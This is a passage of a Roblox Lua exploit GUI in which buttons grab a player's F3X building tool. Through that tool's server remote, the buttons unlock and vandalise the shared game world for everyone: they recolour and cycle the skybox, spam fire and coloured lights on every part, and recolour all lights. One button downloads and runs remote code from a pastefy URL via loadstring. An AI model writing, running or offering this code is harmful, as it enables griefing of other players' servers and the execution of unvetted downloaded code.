		SetMesh(smallestSky, SKY_MESH, targetColor)
	end
end

end)

end

local TextButton14 = Instance.new("TextButton")
TextButton14.Name = "TextButton"
TextButton14.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton14.Text = "set sky colour to red"
TextButton14.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton14.TextSize = 14
TextButton14.TextWrapped = true
TextButton14.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton14.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton14.BorderSizePixel = 2
TextButton14.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton14.Size = UDim2.new(0, 74, 0, 31)
TextButton14.Parent = R[226]

local LocalScript14 = Instance.new("Folder")
LocalScript14.Name = "LocalScript"
LocalScript14.Parent = TextButton14
__S[#__S + 1] = function(...)
local script = LocalScript14
script.Parent.MouseButton1Click:Connect(function()
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local backpack = player.Backpack

local SKY_MESH = "111891702759441"

local function getf3x()
	for _, v in ipairs(backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	return nil
end

local f3x = getf3x()
if not f3x then
	warn("no f3x broo")
	return
end

local function isSky(part)
	if not part:IsA("BasePart") then
		return false
	end
	local mesh = part:FindFirstChildOfClass("SpecialMesh")
	return mesh ~= nil and mesh.MeshId:match("%d+") == SKY_MESH
end

local tool
for i, v in player:GetDescendants() do
	if v.Name == "SyncAPI" then
		tool = v.Parent
	end
end
for i, v in game.ReplicatedStorage:GetDescendants() do
	if v.Name == "SyncAPI" then
		tool = v.Parent
	end
end

local remote = tool.SyncAPI.ServerEndpoint
function _(args)
	remote:InvokeServer(unpack(args))
end

function SetMesh(part, meshid, vertexColor)
	_({ "SyncMesh", { { Part = part, MeshId = "rbxassetid://" .. meshid, VertexColor = vertexColor } } })
end

function UpdateMeshTextureAndColor(part, texid, vertexColor)
	_({ "SyncMesh", { { Part = part, TextureId = "rbxassetid://" .. texid, VertexColor = vertexColor } } })
end

local minScale = math.huge
local smallestSky = nil

for _, v in ipairs(workspace:GetDescendants()) do
	if isSky(v) then
		local mesh = v:FindFirstChildOfClass("SpecialMesh")
		if mesh then
			local currentScale = mesh.Scale.X
			if currentScale < minScale then
				minScale = currentScale
				smallestSky = v
			end
		end
	end
end

if smallestSky then
	local mesh = smallestSky:FindFirstChildOfClass("SpecialMesh")
	local currentTexture = mesh.TextureId:match("%d+") or ""
	local targetColor = Vector3.new(75, 1, 1)

	if currentTexture ~= "" then
		UpdateMeshTextureAndColor(smallestSky, currentTexture, targetColor)
	else
		SetMesh(smallestSky, SKY_MESH, targetColor)
	end
end

end)

end

local TextButton15 = Instance.new("TextButton")
TextButton15.Name = "TextButton"
TextButton15.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton15.Text = "set sky colour to green"
TextButton15.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton15.TextSize = 14
TextButton15.TextWrapped = true
TextButton15.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton15.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton15.BorderSizePixel = 2
TextButton15.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton15.Size = UDim2.new(0, 74, 0, 31)
TextButton15.Parent = R[226]

local LocalScript15 = Instance.new("Folder")
LocalScript15.Name = "LocalScript"
LocalScript15.Parent = TextButton15
__S[#__S + 1] = function(...)
local script = LocalScript15
script.Parent.MouseButton1Click:Connect(function()
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local backpack = player.Backpack

local SKY_MESH = "111891702759441"

local function getf3x()
	for _, v in ipairs(backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	return nil
end

local f3x = getf3x()
if not f3x then
	warn("no f3x broo")
	return
end

local function isSky(part)
	if not part:IsA("BasePart") then
		return false
	end
	local mesh = part:FindFirstChildOfClass("SpecialMesh")
	return mesh ~= nil and mesh.MeshId:match("%d+") == SKY_MESH
end

local tool
for i, v in player:GetDescendants() do
	if v.Name == "SyncAPI" then
		tool = v.Parent
	end
end
for i, v in game.ReplicatedStorage:GetDescendants() do
	if v.Name == "SyncAPI" then
		tool = v.Parent
	end
end

local remote = tool.SyncAPI.ServerEndpoint
function _(args)
	remote:InvokeServer(unpack(args))
end

function SetMesh(part, meshid, vertexColor)
	_({ "SyncMesh", { { Part = part, MeshId = "rbxassetid://" .. meshid, VertexColor = vertexColor } } })
end

function UpdateMeshTextureAndColor(part, texid, vertexColor)
	_({ "SyncMesh", { { Part = part, TextureId = "rbxassetid://" .. texid, VertexColor = vertexColor } } })
end

local minScale = math.huge
local smallestSky = nil

for _, v in ipairs(workspace:GetDescendants()) do
	if isSky(v) then
		local mesh = v:FindFirstChildOfClass("SpecialMesh")
		if mesh then
			local currentScale = mesh.Scale.X
			if currentScale < minScale then
				minScale = currentScale
				smallestSky = v
			end
		end
	end
end

if smallestSky then
	local mesh = smallestSky:FindFirstChildOfClass("SpecialMesh")
	local currentTexture = mesh.TextureId:match("%d+") or ""
	local targetColor = Vector3.new(1, 75, 1)

	if currentTexture ~= "" then
		UpdateMeshTextureAndColor(smallestSky, currentTexture, targetColor)
	else
		SetMesh(smallestSky, SKY_MESH, targetColor)
	end
end

end)

end

local TextButton16 = Instance.new("TextButton")
TextButton16.Name = "TextButton"
TextButton16.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton16.Text = "set sky colour to blue"
TextButton16.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton16.TextSize = 14
TextButton16.TextWrapped = true
TextButton16.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton16.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton16.BorderSizePixel = 2
TextButton16.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton16.Size = UDim2.new(0, 74, 0, 31)
TextButton16.Parent = R[226]

local LocalScript16 = Instance.new("Folder")
LocalScript16.Name = "LocalScript"
LocalScript16.Parent = TextButton16
__S[#__S + 1] = function(...)
local script = LocalScript16
script.Parent.MouseButton1Click:Connect(function()
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local backpack = player.Backpack

local SKY_MESH = "111891702759441"

local function getf3x()
	for _, v in ipairs(backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	return nil
end

local f3x = getf3x()
if not f3x then
	warn("no f3x broo")
	return
end

local function isSky(part)
	if not part:IsA("BasePart") then
		return false
	end
	local mesh = part:FindFirstChildOfClass("SpecialMesh")
	return mesh ~= nil and mesh.MeshId:match("%d+") == SKY_MESH
end

local tool
for i, v in player:GetDescendants() do
	if v.Name == "SyncAPI" then
		tool = v.Parent
	end
end
for i, v in game.ReplicatedStorage:GetDescendants() do
	if v.Name == "SyncAPI" then
		tool = v.Parent
	end
end

local remote = tool.SyncAPI.ServerEndpoint
function _(args)
	remote:InvokeServer(unpack(args))
end

function SetMesh(part, meshid, vertexColor)
	_({ "SyncMesh", { { Part = part, MeshId = "rbxassetid://" .. meshid, VertexColor = vertexColor } } })
end

function UpdateMeshTextureAndColor(part, texid, vertexColor)
	_({ "SyncMesh", { { Part = part, TextureId = "rbxassetid://" .. texid, VertexColor = vertexColor } } })
end

local minScale = math.huge
local smallestSky = nil

for _, v in ipairs(workspace:GetDescendants()) do
	if isSky(v) then
		local mesh = v:FindFirstChildOfClass("SpecialMesh")
		if mesh then
			local currentScale = mesh.Scale.X
			if currentScale < minScale then
				minScale = currentScale
				smallestSky = v
			end
		end
	end
end

if smallestSky then
	local mesh = smallestSky:FindFirstChildOfClass("SpecialMesh")
	local currentTexture = mesh.TextureId:match("%d+") or ""
	local targetColor = Vector3.new(1, 1, 75)

	if currentTexture ~= "" then
		UpdateMeshTextureAndColor(smallestSky, currentTexture, targetColor)
	else
		SetMesh(smallestSky, SKY_MESH, targetColor)
	end
end

end)

end

local TextButton17 = Instance.new("TextButton")
TextButton17.Name = "TextButton"
TextButton17.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton17.Text = "disco skybox"
TextButton17.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton17.TextSize = 14
TextButton17.TextWrapped = true
TextButton17.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton17.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton17.BorderSizePixel = 2
TextButton17.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton17.Size = UDim2.new(0, 74, 0, 31)
TextButton17.Parent = R[226]

local LocalScript17 = Instance.new("Folder")
LocalScript17.Name = "LocalScript"
LocalScript17.Parent = TextButton17
__S[#__S + 1] = function(...)
local script = LocalScript17
script.Parent.MouseButton1Click:Connect(function()
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local backpack = player.Backpack

local SKY_MESH = "111891702759441"

local function getf3x()
	for _, v in ipairs(backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	return nil
end

local function isSky(part)
	if not part:IsA("BasePart") then
		return false
	end
	local mesh = part:FindFirstChildOfClass("SpecialMesh")
	return mesh ~= nil and mesh.MeshId:match("%d+") == SKY_MESH
end

local tool
for i, v in player:GetDescendants() do
	if v.Name == "SyncAPI" then
		tool = v.Parent
	end
end
for i, v in game.ReplicatedStorage:GetDescendants() do
	if v.Name == "SyncAPI" then
		tool = v.Parent
	end
end

if not tool then return end

local remote = tool.SyncAPI.ServerEndpoint
function _(args)
	remote:InvokeServer(unpack(args))
end

function SetMesh(part, meshid, vertexColor)
	_({ "SyncMesh", { { Part = part, MeshId = "rbxassetid://" .. meshid, VertexColor = vertexColor } } })
end

function UpdateMeshTextureAndColor(part, texid, vertexColor)
	_({ "SyncMesh", { { Part = part, TextureId = "rbxassetid://" .. texid, VertexColor = vertexColor } } })
end

local function getSmallestSky()
	local minScale = math.huge
	local smallestSky = nil

	for _, v in ipairs(workspace:GetDescendants()) do
		if isSky(v) then
			local mesh = v:FindFirstChildOfClass("SpecialMesh")
			if mesh then
				local currentScale = mesh.Scale.X
				if currentScale < minScale then
					minScale = currentScale
					smallestSky = v
				end
			end
		end
	end
	return smallestSky
end

local colorSequence = {
	Vector3.new(75, 1, 1),
	Vector3.new(1, 75, 1),
	Vector3.new(1, 1, 75)
}
local sequenceIndex = 1

while true do
	local f3x = getf3x()
	if not f3x or not f3x:FindFirstChild("SyncAPI") then
		break
	end

	local targetSky = getSmallestSky()
	if targetSky then
		local mesh = targetSky:FindFirstChildOfClass("SpecialMesh")
		if mesh then
			local currentTexture = mesh.TextureId:match("%d+") or ""
			local nextColor = colorSequence[sequenceIndex]

			pcall(function()
				if currentTexture ~= "" then
					UpdateMeshTextureAndColor(targetSky, currentTexture, nextColor)
				else
					SetMesh(targetSky, SKY_MESH, nextColor)
				end
			end)
			
			sequenceIndex = sequenceIndex % #colorSequence + 1
		end
	end
	
	task.wait(0.2)
end

end)

end

local TextButton18 = Instance.new("TextButton")
TextButton18.Name = "TextButton"
TextButton18.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton18.Text = "elv4gui"
TextButton18.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton18.TextSize = 14
TextButton18.TextWrapped = true
TextButton18.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton18.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton18.BorderSizePixel = 2
TextButton18.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton18.Size = UDim2.new(0, 74, 0, 31)
TextButton18.Parent = R[226]

local LocalScript18 = Instance.new("Folder")
LocalScript18.Name = "LocalScript"
LocalScript18.Parent = TextButton18
__S[#__S + 1] = function(...)
local script = LocalScript18
script.Parent.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://pastefy.app/5R7ja4u4/raw"))()
end)
end

local TextButton19 = Instance.new("TextButton")
TextButton19.Name = "TextButton"
TextButton19.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton19.Text = "random coloured fire spam"
TextButton19.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton19.TextSize = 14
TextButton19.TextWrapped = true
TextButton19.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton19.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton19.BorderSizePixel = 2
TextButton19.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton19.Size = UDim2.new(0, 74, 0, 31)
TextButton19.Parent = R[226]

local LocalScript19 = Instance.new("Folder")
LocalScript19.Name = "LocalScript"
LocalScript19.Parent = TextButton19
__S[#__S + 1] = function(...)
local script = LocalScript19
script.Parent.MouseButton1Click:Connect(function()
local player = game.Players.LocalPlayer
local char = player.Character
local backpack = player.Backpack

local function getf3x()
    for _, v in ipairs(backpack:GetChildren()) do
        if v:FindFirstChild("SyncAPI") then return v end
    end
    for _, v in ipairs(char:GetChildren()) do
        if v:FindFirstChild("SyncAPI") then return v end
    end
    for _, v in ipairs(player:GetDescendants()) do
        if v.Name == "SyncAPI" then return v.Parent end
    end
    for _, v in ipairs(game.ReplicatedStorage:GetDescendants()) do
        if v.Name == "SyncAPI" then return v.Parent end
    end
    return nil
end

local tool = getf3x()
if not tool then return end

local remote = tool.SyncAPI.ServerEndpoint
local function _(args)
    remote:InvokeServer(unpack(args))
end

local function GetTargets()
    local t = {}
    for _, v in ipairs(workspace:GetDescendants()) do
        if v:IsA("BasePart") and v.Name ~= "Terrain" and not string.find(v.Name, "Sky") then
            t[#t+1] = v
        end
    end
    return t
end

local function CreateFire()
    local targets = GetTargets()
    local batch = {}
    for _, part in ipairs(targets) do
        batch[#batch+1] = {["Part"] = part, ["DecorationType"] = "Fire"}
    end
    if #batch > 0 then
        _({"CreateDecorations", batch})
    end
end

local function SyncFire()
    local targets = GetTargets()
    local batch = {}
    for _, part in ipairs(targets) do
        local size = math.random(5, 25)
        local r = math.random()
        local g = math.random()
        local b = math.random()
        batch[#batch+1] = {
            ["Part"] = part,
            ["DecorationType"] = "Fire",
            ["Size"] = size,
            ["Heat"] = math.random(10, 35),
            ["Color"] = Color3.new(r, g, b)
        }
    end
    if #batch > 0 then
        _({"SyncDecorate", batch})
    end
end

CreateFire()
task.wait(0.2)
SyncFire()

end)
end

local TextButton20 = Instance.new("TextButton")
TextButton20.Name = "TextButton"
TextButton20.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton20.Text = "random coloured light spam"
TextButton20.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton20.TextSize = 14
TextButton20.TextWrapped = true
TextButton20.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton20.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton20.BorderSizePixel = 2
TextButton20.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton20.Size = UDim2.new(0, 74, 0, 31)
TextButton20.Parent = R[226]

local LocalScript20 = Instance.new("Folder")
LocalScript20.Name = "LocalScript"
LocalScript20.Parent = TextButton20
__S[#__S + 1] = function(...)
local script = LocalScript20
script.Parent.MouseButton1Click:Connect(function()
local player = game.Players.LocalPlayer
local char = player.Character
local backpack = player.Backpack

local function getf3x()
	for _, v in ipairs(backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(player:GetDescendants()) do
		if v.Name == "SyncAPI" then return v.Parent end
	end
	for _, v in ipairs(game.ReplicatedStorage:GetDescendants()) do
		if v.Name == "SyncAPI" then return v.Parent end
	end
	return nil
end

local tool = getf3x()
if not tool then 
	warn("No F3X found!")
	return 
end

local remote = tool.SyncAPI.ServerEndpoint
local function _(args)
	remote:InvokeServer(unpack(args))
end

function SetCollision(part, boolean)
	_({"SyncCollision", {{["Part"] = part, ["CanCollide"] = boolean}}})
end

function SetAnchor(boolean, part)
	_({"SyncAnchor", {{["Part"] = part, ["Anchored"] = boolean}}})
end

function CreatePart(cf, parent)
	_({"CreatePart", "Normal", cf, parent})
end

function DestroyPart(part)
	_({"Remove", {part}})
end

function MovePart(part, cf)
	_({"SyncMove", {{["Part"] = part, ["CFrame"] = cf}}})
end

function Resize(part, size, cf)
	_({"SyncResize", {{["Part"] = part, ["CFrame"] = cf, ["Size"] = size}}})
end

function AddMesh(part)
	_({"CreateMeshes", {{["Part"] = part}}})
end

function SetMesh(part, meshid)
	_({"SyncMesh", {{["Part"] = part, ["MeshId"] = "rbxassetid://"..meshid}}})
end

function SetTexture(part, texid)
	_({"SyncMesh", {{["Part"] = part, ["TextureId"] = "rbxassetid://"..texid}}})
end

function SetName(part, stringg)
	_({"SetName", {part}, stringg})
end

function MeshResize(part, size)
	_({"SyncMesh", {{["Part"] = part, ["Scale"] = size}}})
end

function Weld(part1, part2, lead)
	_({"CreateWelds", {part1, part2}, lead})
end

function SetLocked(part, boolean)
	_({"SetLocked", {part}, boolean})
end

function SetTrans(part, int)
	_({"SyncMaterial", {{["Part"] = part, ["Transparency"] = int}}})
end

function CreateSpotlight(part)
	_({"CreateLights", {{["Part"] = part, ["LightType"] = "SpotLight"}}})
end

function SyncLighting(part, brightness)
	_({"SyncLighting", {{["Part"] = part, ["LightType"] = "SpotLight", ["Brightness"] = brightness}}})
end

function AddFire(part)
	_({"CreateDecorations", {{["Part"] = part, ["DecorationType"] = "Fire"}}})
end

function LightParts()
	local targets = {}
	local unlockBatch = {}
	local lightCreateBatch = {}
	local lightSyncBatch = {}

	for _, v in ipairs(workspace:GetDescendants()) do
		if v:IsA("BasePart") and v.Name ~= "Terrain" and not string.find(v.Name, "Sky") then
			if not v:FindFirstAncestorOfClass("Model") or not game.Players:GetPlayerFromCharacter(v:FindFirstAncestorOfClass("Model")) then
				table.insert(targets, v)
			end
		end
	end

	for _, part in ipairs(targets) do
		table.insert(unlockBatch, part)
		table.insert(lightCreateBatch, {["Part"] = part, ["LightType"] = "PointLight"})
		table.insert(lightSyncBatch, {
			["Part"] = part, 
			["LightType"] = "PointLight", 
			["Range"] = 100, 
			["Brightness"] = 2, 
			["Color"] = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
		})
	end

	if #targets > 0 then
		_({"SetLocked", unlockBatch, false})
		_({"CreateLights", lightCreateBatch})
		_({"SyncLighting", lightSyncBatch})
	end
end

function FireParts()
	local targets = {}
	local unlockBatch = {}
	local fireCreateBatch = {}
	local fireSyncBatch = {}

	for _, v in ipairs(workspace:GetDescendants()) do
		if v:IsA("BasePart") and v.Name ~= "Terrain" and not string.find(v.Name, "Sky") then
			if not v:FindFirstAncestorOfClass("Model") or not game.Players:GetPlayerFromCharacter(v:FindFirstAncestorOfClass("Model")) then
				table.insert(targets, v)
			end
		end
	end

	for _, part in ipairs(targets) do
		table.insert(unlockBatch, part)
		table.insert(fireCreateBatch, {["Part"] = part, ["DecorationType"] = "Fire"})
		table.insert(fireSyncBatch, {["Part"] = part, ["DecorationType"] = "Fire", ["Size"] = 15, ["Heat"] = 25, ["Color"] = Color3.new(0.552941, 0, 0)})
	end

	if #targets > 0 then
		_({"SetLocked", unlockBatch, false})
		_({"CreateDecorations", fireCreateBatch})
		_({"SyncDecorate", fireSyncBatch})
	end
end

LightParts()

end)
end

local TextButton21 = Instance.new("TextButton")
TextButton21.Name = "TextButton"
TextButton21.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton21.Text = "make lights red"
TextButton21.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton21.TextSize = 14
TextButton21.TextWrapped = true
TextButton21.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton21.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton21.BorderSizePixel = 2
TextButton21.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton21.Size = UDim2.new(0, 74, 0, 31)
TextButton21.Parent = R[226]

local LocalScript21 = Instance.new("Folder")
LocalScript21.Name = "LocalScript"
LocalScript21.Parent = TextButton21
__S[#__S + 1] = function(...)
local script = LocalScript21
script.Parent.MouseButton1Click:Connect(function()
local player = game.Players.LocalPlayer
local char = player.Character
local backpack = player.Backpack

local function getf3x()
	for _, v in ipairs(backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(player:GetDescendants()) do
		if v.Name == "SyncAPI" then return v.Parent end
	end
	for _, v in ipairs(game.ReplicatedStorage:GetDescendants()) do
		if v.Name == "SyncAPI" then return v.Parent end
	end
	return nil
end

local tool = getf3x()
if not tool then 
	warn("No F3X found!")
	return 
end

local remote = tool.SyncAPI.ServerEndpoint
local function _(args)
	remote:InvokeServer(unpack(args))
end

function SetCollision(part, boolean)
	_({"SyncCollision", {{["Part"] = part, ["CanCollide"] = boolean}}})
end

function SetAnchor(boolean, part)
	_({"SyncAnchor", {{["Part"] = part, ["Anchored"] = boolean}}})
end

function CreatePart(cf, parent)
	_({"CreatePart", "Normal", cf, parent})
end

function DestroyPart(part)
	_({"Remove", {part}})
end

function MovePart(part, cf)
	_({"SyncMove", {{["Part"] = part, ["CFrame"] = cf}}})
end

function Resize(part, size, cf)
	_({"SyncResize", {{["Part"] = part, ["CFrame"] = cf, ["Size"] = size}}})
end

function AddMesh(part)
	_({"CreateMeshes", {{["Part"] = part}}})
end

function SetMesh(part, meshid)
	_({"SyncMesh", {{["Part"] = part, ["MeshId"] = "rbxassetid://"..meshid}}})
end

function SetTexture(part, texid)
	_({"SyncMesh", {{["Part"] = part, ["TextureId"] = "rbxassetid://"..texid}}})
end

function SetName(part, stringg)
	_({"SetName", {part}, stringg})
end

function MeshResize(part, size)
	_({"SyncMesh", {{["Part"] = part, ["Scale"] = size}}})
end

function Weld(part1, part2, lead)
	_({"CreateWelds", {part1, part2}, lead})
end

function SetLocked(part, boolean)
	_({"SetLocked", {part}, boolean})
end

function SetTrans(part, int)
	_({"SyncMaterial", {{["Part"] = part, ["Transparency"] = int}}})
end

function CreateSpotlight(part)
	_({"CreateLights", {{["Part"] = part, ["LightType"] = "SpotLight"}}})
end

function SyncLighting(part, brightness)
	_({"SyncLighting", {{["Part"] = part, ["LightType"] = "SpotLight", ["Brightness"] = brightness}}})
end

function AddFire(part)
	_({"CreateDecorations", {{["Part"] = part, ["DecorationType"] = "Fire"}}})
end

function RedLights()
	local targets = {}
	local lightSyncBatch = {}

	for _, v in ipairs(workspace:GetDescendants()) do
		if v:IsA("Light") then
			local part = v.Parent
			if part and part:IsA("BasePart") then
				if not part:FindFirstAncestorOfClass("Model") or not game.Players:GetPlayerFromCharacter(part:FindFirstAncestorOfClass("Model")) then
					table.insert(targets, {part = part, className = v.ClassName})
				end
			end
		end
	end

	for _, info in ipairs(targets) do
		table.insert(lightSyncBatch, {
			["Part"] = info.part, 
			["LightType"] = info.className, 
			["Color"] = Color3.fromRGB(255, 0, 0)
		})
	end

	if #lightSyncBatch > 0 then
		_({"SyncLighting", lightSyncBatch})
	end
end

RedLights()

end)
end

local TextButton22 = Instance.new("TextButton")
TextButton22.Name = "TextButton"
TextButton22.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton22.Text = "make lights green"
TextButton22.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton22.TextSize = 14
TextButton22.TextWrapped = true
TextButton22.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton22.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton22.BorderSizePixel = 2
TextButton22.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton22.Size = UDim2.new(0, 74, 0, 31)
TextButton22.Parent = R[226]

local LocalScript22 = Instance.new("Folder")
LocalScript22.Name = "LocalScript"
LocalScript22.Parent = TextButton22
__S[#__S + 1] = function(...)
local script = LocalScript22
script.Parent.MouseButton1Click:Connect(function()
local player = game.Players.LocalPlayer
local char = player.Character
local backpack = player.Backpack

local function getf3x()
	for _, v in ipairs(backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(player:GetDescendants()) do
		if v.Name == "SyncAPI" then return v.Parent end
	end
	for _, v in ipairs(game.ReplicatedStorage:GetDescendants()) do
		if v.Name == "SyncAPI" then return v.Parent end
	end
	return nil
end

local tool = getf3x()
if not tool then 
	warn("No F3X found!")
	return 
end

local remote = tool.SyncAPI.ServerEndpoint
local function _(args)
	remote:InvokeServer(unpack(args))
end

function SetCollision(part, boolean)
	_({"SyncCollision", {{["Part"] = part, ["CanCollide"] = boolean}}})
end

function SetAnchor(boolean, part)
	_({"SyncAnchor", {{["Part"] = part, ["Anchored"] = boolean}}})
end

function CreatePart(cf, parent)
	_({"CreatePart", "Normal", cf, parent})
end

function DestroyPart(part)
	_({"Remove", {part}})
end

function MovePart(part, cf)
	_({"SyncMove", {{["Part"] = part, ["CFrame"] = cf}}})
end

function Resize(part, size, cf)
	_({"SyncResize", {{["Part"] = part, ["CFrame"] = cf, ["Size"] = size}}})
end

function AddMesh(part)
	_({"CreateMeshes", {{["Part"] = part}}})
end

function SetMesh(part, meshid)
	_({"SyncMesh", {{["Part"] = part, ["MeshId"] = "rbxassetid://"..meshid}}})
end

function SetTexture(part, texid)
	_({"SyncMesh", {{["Part"] = part, ["TextureId"] = "rbxassetid://"..texid}}})
end

function SetName(part, stringg)
	_({"SetName", {part}, stringg})
end

function MeshResize(part, size)
	_({"SyncMesh", {{["Part"] = part, ["Scale"] = size}}})
end

function Weld(part1, part2, lead)
	_({"CreateWelds", {part1, part2}, lead})
end

function SetLocked(part, boolean)
	_({"SetLocked", {part}, boolean})
end

function SetTrans(part, int)
	_({"SyncMaterial", {{["Part"] = part, ["Transparency"] = int}}})
end

function CreateSpotlight(part)
	_({"CreateLights", {{["Part"] = part, ["LightType"] = "SpotLight"}}})
end

function SyncLighting(part, brightness)
	_({"SyncLighting", {{["Part"] = part, ["LightType"] = "SpotLight", ["Brightness"] = brightness}}})
end

function AddFire(part)
	_({"CreateDecorations", {{["Part"] = part, ["DecorationType"] = "Fire"}}})
end

function RedLights()
	local targets = {}
	local lightSyncBatch = {}

	for _, v in ipairs(workspace:GetDescendants()) do
		if v:IsA("Light") then
			local part = v.Parent
			if part and part:IsA("BasePart") then
				if not part:FindFirstAncestorOfClass("Model") or not game.Players:GetPlayerFromCharacter(part:FindFirstAncestorOfClass("Model")) then
					table.insert(targets, {part = part, className = v.ClassName})
				end
			end
		end
	end

	for _, info in ipairs(targets) do
		table.insert(lightSyncBatch, {
			["Part"] = info.part, 
			["LightType"] = info.className, 
			["Color"] = Color3.fromRGB(0, 255, 0)
		})
	end

	if #lightSyncBatch > 0 then
		_({"SyncLighting", lightSyncBatch})
	end
end

RedLights()

end)
end

local TextButton23 = Instance.new("TextButton")
TextButton23.Name = "TextButton"
TextButton23.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton23.Text = "make lights blue"
TextButton23.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton23.TextSize = 14
TextButton23.TextWrapped = true
TextButton23.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton23.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton23.BorderSizePixel = 2
TextButton23.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton23.Size = UDim2.new(0, 74, 0, 31)
TextButton23.Parent = R[226]

local LocalScript23 = Instance.new("Folder")
LocalScript23.Name = "LocalScript"
LocalScript23.Parent = TextButton23
__S[#__S + 1] = function(...)
local script = LocalScript23
script.Parent.MouseButton1Click:Connect(function()
local player = game.Players.LocalPlayer
local char = player.Character
local backpack = player.Backpack

local function getf3x()
	for _, v in ipairs(backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(player:GetDescendants()) do
		if v.Name == "SyncAPI" then return v.Parent end
	end
	for _, v in ipairs(game.ReplicatedStorage:GetDescendants()) do
		if v.Name == "SyncAPI" then return v.Parent end
	end
	return nil
end

local tool = getf3x()
if not tool then 
	warn("No F3X found!")
	return 
end

local remote = tool.SyncAPI.ServerEndpoint
local function _(args)
	remote:InvokeServer(unpack(args))
end

function SetCollision(part, boolean)
	_({"SyncCollision", {{["Part"] = part, ["CanCollide"] = boolean}}})
end

function SetAnchor(boolean, part)
